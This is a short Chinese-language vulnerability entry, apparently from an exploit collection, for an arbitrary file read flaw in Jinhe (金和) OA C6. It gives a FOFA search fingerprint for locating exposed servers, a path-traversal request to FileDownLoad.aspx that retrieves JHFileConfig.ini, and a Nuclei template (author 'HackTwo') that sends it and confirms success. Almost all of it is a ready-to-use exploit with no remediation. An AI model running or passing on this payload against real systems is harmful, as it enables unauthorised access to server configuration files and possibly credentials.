# 金和OA-C6-FileDownLoad文件读取漏洞

- **系统**：金和OA　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`body="JHSoft.Web.AddMenu"`
- **请求**：`GET /c6/JHSoft.Web.CustomQuery/FileDownLoad.aspx?FilePath=../Resource/JHFileConfig.ini HTTP/1.1`
- **关键头**：`Host: 127.0.0.1`

**请求体 / payload**
```
Nuclei验证
id: JHOA-FileDownLoad-Read
info:
name: 金和OA-任意文件读取-FileDownLoad
author: HackTwo
severity: high
metadata:
fofa-query:  body="JHSoft.Web.AddMenu"
variables:
filename: "{{to_lower(rand_base(10))}}"
boundary: "{{to_lower(rand_base(20))}}"
http:
- raw:
-
GET /c6/JHSoft.Web.CustomQuery/FileDownLoad.aspx?FilePath=../Resource/JHFileConfig.ini HTTP/1.1
Host: {{Hostname}}
matchers:
- type: dsl
dsl:
- status_code==200 && contains_all(body,"FolderTotal")
```